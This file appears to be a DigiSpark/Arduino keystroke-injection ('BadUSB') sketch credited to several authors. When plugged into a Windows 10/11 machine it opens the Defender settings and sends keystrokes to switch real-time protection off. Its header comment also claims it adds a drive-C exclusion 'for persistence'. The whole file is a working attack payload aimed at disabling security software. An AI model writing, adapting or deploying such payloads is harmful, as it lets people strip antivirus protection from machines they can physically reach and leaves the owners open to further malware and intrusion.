//Disabe windows defender by sending keystrokes
#include "DigiKeyboardFr.h"



void loop() {}

void setup() {
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(1000);
  // Title: Disable Windows Defender
  // Author: Zero_Sploit (v1.0)
  // Updated: B33m0 (v1.1)
  // Updated: UberGuidoZ (v1.2)
  // Description: Opens security settings, disabled Defender, then adds an exception of drive C for persistence
  // Target: Windows 10/11 (Powershell)
  // Version: 1.2
  // Pause for everything to recognize and be ready
  DigiKeyboardFr.delay(2000);
  // Open Windows Defender Settings
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(750);
  DigiKeyboardFr.print(F("windowsdefender:"));
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  // Navigate to Manage Settings
  DigiKeyboardFr.delay(10000);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(100);
  DigiKeyboardFr.sendKeyStroke(43);
  DigiKeyboardFr.sendKeyStroke(43);
  DigiKeyboardFr.sendKeyStroke(43);
  DigiKeyboardFr.sendKeyStroke(43);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(44);
  DigiKeyboardFr.delay(750);
  DigiKeyboardFr.sendKeyStroke(43);
  DigiKeyboardFr.sendKeyStroke(43);
  DigiKeyboardFr.sendKeyStroke(44);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}
